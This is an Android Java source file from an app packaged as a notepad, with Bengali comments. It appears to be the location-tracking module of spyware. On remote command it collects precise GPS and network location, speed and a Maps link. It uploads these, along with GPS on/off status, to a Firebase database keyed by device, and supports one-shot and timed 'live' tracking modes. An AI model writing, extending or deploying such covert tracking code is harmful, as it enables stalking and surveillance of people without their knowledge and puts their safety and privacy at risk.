package com.megh.notepad; // আপনার প্যাকেজের নাম

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

// ফায়ারবেস ইমপোর্ট
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class LocationHelper {

    private static LocationManager locationManager;
    private static LocationListener locationListener;
    private static Location currentBestLocation; // সবচেয়ে সঠিক লোকেশন সেভ রাখার জন্য
    private static final int TWO_MINUTES = 1000 * 60 * 2;
    
    // টাইমার এবং মোড কন্ট্রোল করার জন্য ভেরিয়েবল
    private static Handler autoStopHandler = new Handler(Looper.getMainLooper());
    private static Runnable autoStopRunnable;
    private static String currentMode = "single"; // ডিফল্ট মোড

    // নতুন প্যারামিটার: mode, intervalMs, durationMs
    public static void startMonitoring(final Context context, String mode, long intervalMs, long durationMs) {
        
        // 🌟 ফিক্স: Static Context (mContext) রিমুভ করে Application Context নেওয়া হলো মেমরি লিক ঠেকাতে 🌟
        final Context appContext = context.getApplicationContext();
        currentMode = mode;
        
        // আগে থেকে কোনো ট্র্যাকিং চললে তা রিসেট করে নেওয়া
        stopMonitoring(appContext);

        if (ContextCompat.checkSelfPermission(appContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Log.e("LocationHelper", "Location permission denied!");
            updateStatusOnFirebase("Permission Denied");
            return;
        }

        if (locationManager == null) {
            locationManager = (LocationManager) appContext.getSystemService(Context.LOCATION_SERVICE);
        }

        if (locationListener == null) {
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    // নতুন লোকেশনটি কি আগেরটার চেয়ে ভালো/নির্ভুল? তা যাচাই করা
                    if (isBetterLocation(location, currentBestLocation)) {
                        currentBestLocation = location;
                        sendLocationToFirebase(location);
                        
                        // ম্যাজিক: যদি "single" মোড হয়, তবে প্রথম নির্ভুল লোকেশন পাঠিয়েই জিপিএস অফ করে দেবে!
                        if ("single".equals(currentMode)) {
                            Log.d("LocationHelper", "Single mode complete. Stopping location.");
                            stopMonitoring(appContext);
                            updateStatusOnFirebase("Single fetch completed");
                        }
                    }
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {
                    updateGpsStatus(true);
                }

                @Override
                public void onProviderDisabled(String provider) {
                    updateGpsStatus(false);
                }
            };

            try {
                boolean isGpsEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
                boolean isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
                
                updateGpsStatus(isGpsEnabled || isNetworkEnabled);
                updateStatusOnFirebase("Tracking Started (" + currentMode + " mode)");

                // ফায়ারবেস থেকে পাওয়া ইন্টারভ্যাল অনুযায়ী সেট করা (ডিফল্ট ৩ সেকেন্ড)
                long minTimeMs = intervalMs > 0 ? intervalMs : 3000; 
                float minDistanceM = 0f; // দূরত্ব ০ রাখা হলো যাতে শুধু সময়ের ওপর নির্ভর করে আপডেট দেয়

                // জিপিএস এবং নেটওয়ার্ক দুটি দিয়েই রিকোয়েস্ট করা হলো
                if (isGpsEnabled) {
                    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, minTimeMs, minDistanceM, locationListener, Looper.getMainLooper());
                }
                if (isNetworkEnabled) {
                    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, minTimeMs, minDistanceM, locationListener, Looper.getMainLooper());
                }
                
                // "live" মোড হলে অটো-স্টপ হওয়ার টাইমার সেট করা
                if ("live".equals(currentMode) && durationMs > 0) {
                    autoStopRunnable = new Runnable() {
                        @Override
                        public void run() {
                            Log.d("LocationHelper", "Live duration ended. Auto stopping location.");
                            stopMonitoring(appContext);
                            updateStatusOnFirebase("Live tracking duration ended");
                        }
                    };
                    autoStopHandler.postDelayed(autoStopRunnable, durationMs);
                }

            } catch (SecurityException e) {
                Log.e("LocationHelper", "SecurityException: " + e.getMessage());
                updateStatusOnFirebase("Security Exception: " + e.getMessage());
            }
        }
    }

    public static void stopMonitoring(Context context) {
        // লোকেশন আপডেট বন্ধ করা
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
            locationListener = null;
        }
        
        // পেন্ডিং অটো-স্টপ টাইমার ক্যানসেল করা
        if (autoStopHandler != null && autoStopRunnable != null) {
            autoStopHandler.removeCallbacks(autoStopRunnable);
            autoStopRunnable = null;
        }
        
        currentBestLocation = null; // পুরোনো ক্যাশ ক্লিয়ার করা
    }

    // লোকেশন ডাটা ফায়ারবেসে পাঠানোর মেথড
    private static void sendLocationToFirebase(Location location) {
        try {
            // যদি লোকেশনের ভুল (Accuracy) ১০০ মিটারের বেশি হয়, তবে সেটি না পাঠানোই ভালো
            if (location.getAccuracy() > 100) {
                Log.d("LocationHelper", "Ignored inaccurate location. Accuracy: " + location.getAccuracy());
                return;
            }

            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("LocationInfo");

            double latitude = location.getLatitude();
            double longitude = location.getLongitude();
            float accuracy = location.getAccuracy(); 
            double speed = location.getSpeed() * 3.6; 
            
            String mapsLink = "https://www.google.com/maps/search/?api=1&query=" + latitude + "," + longitude;

            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy hh:mm:ss a", Locale.getDefault());
            String time = sdf.format(new Date(location.getTime()));

            Map<String, Object> locationData = new HashMap<>();
            locationData.put("Latitude", latitude);
            locationData.put("Longitude", longitude);
            locationData.put("Accuracy", String.format(Locale.US, "%.1f meters", accuracy));
            locationData.put("Speed", String.format(Locale.US, "%.1f km/h", speed));
            locationData.put("Google_Maps_Link", mapsLink);
            locationData.put("Last_Updated", time);
            locationData.put("Provider", location.getProvider()); 
            locationData.put("Current_Mode", currentMode); 

            // 🌟 ফিক্স: setValue এর বদলে updateChildren দেওয়া হলো যাতে System_Status বা GPS_Status মুছে না যায় 🌟
            dbRef.updateChildren(locationData);
            Log.d("LocationHelper", "Exact location sent! Accuracy: " + accuracy + "m");

        } catch (Exception e) {
            Log.e("LocationHelper", "Error sending location: " + e.getMessage());
        }
    }

    private static void updateGpsStatus(boolean isEnabled) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("LocationInfo");
            
            dbRef.child("GPS_Status").setValue(isEnabled ? "Enabled" : "Disabled (Turn on GPS)");
        } catch (Exception e) {
            Log.e("LocationHelper", "Error updating GPS status: " + e.getMessage());
        }
    }
    
    // সিস্টেমের বর্তমান অবস্থা ফায়ারবেসে জানানোর জন্য
    private static void updateStatusOnFirebase(String message) {
         try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("LocationInfo");
            dbRef.child("System_Status").setValue(message);
        } catch (Exception e) {
            Log.e("LocationHelper", "Error updating system status: " + e.getMessage());
        }
    }

    // গুগল অ্যান্ড্রয়েড ডেভেলপার ডকস অনুযায়ী সঠিক লোকেশন বাছাই করার অ্যালগরিদম
    protected static boolean isBetterLocation(Location location, Location currentBestLocation) {
        if (currentBestLocation == null) {
            return true;
        }

        long timeDelta = location.getTime() - currentBestLocation.getTime();
        boolean isSignificantlyNewer = timeDelta > TWO_MINUTES;
        boolean isSignificantlyOlder = timeDelta < -TWO_MINUTES;
        boolean isNewer = timeDelta > 0;

        if (isSignificantlyNewer) {
            return true;
        } else if (isSignificantlyOlder) {
            return false;
        }

        int accuracyDelta = (int) (location.getAccuracy() - currentBestLocation.getAccuracy());
        boolean isLessAccurate = accuracyDelta > 0;
        boolean isMoreAccurate = accuracyDelta < 0;
        boolean isSignificantlyLessAccurate = accuracyDelta > 200;

        boolean isFromSameProvider = isSameProvider(location.getProvider(), currentBestLocation.getProvider());

        if (isMoreAccurate) {
            return true;
        } else if (isNewer && !isLessAccurate) {
            return true;
        } else if (isNewer && !isSignificantlyLessAccurate && isFromSameProvider) {
            return true;
        }
        return false;
    }

    private static boolean isSameProvider(String provider1, String provider2) {
        if (provider1 == null) {
            return provider2 == null;
        }
        return provider1.equals(provider2);
    }
}

